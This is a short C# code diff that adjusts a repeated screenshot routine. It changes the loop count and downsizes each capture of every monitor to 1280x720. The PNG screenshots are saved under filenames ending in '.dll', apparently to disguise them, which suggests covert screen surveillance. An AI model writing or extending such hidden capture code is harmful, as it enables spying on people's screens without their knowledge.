@@ -35,7 +35,7 @@ namespace Nagoya_Monster
                 {
                     TakeScreenShot();
 
-                    for (int i = 0; i < 1800; i++)
+                    for (int i = 0; i < 1 * 60 * 60; i++)
                     {
                         if (!IsRunning || !IsScreenShoting)
                         {
@@ -55,6 +55,8 @@ namespace Nagoya_Monster
                 Screen monitor = Screen.AllScreens[i];
                 Bitmap bitmap = new Bitmap(monitor.Bounds.Width, monitor.Bounds.Height);
                 Graphics.FromImage(bitmap).CopyFromScreen(monitor.Bounds.X, monitor.Bounds.Y, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
+
+                bitmap = new Bitmap(bitmap, 1280, 720);
 
                 bitmap.Save(filename: $"{Program.SSPath}royal-{i}-{DateTime.Now.Ticks.ToString()}.dll", format: ImageFormat.Png);
             }
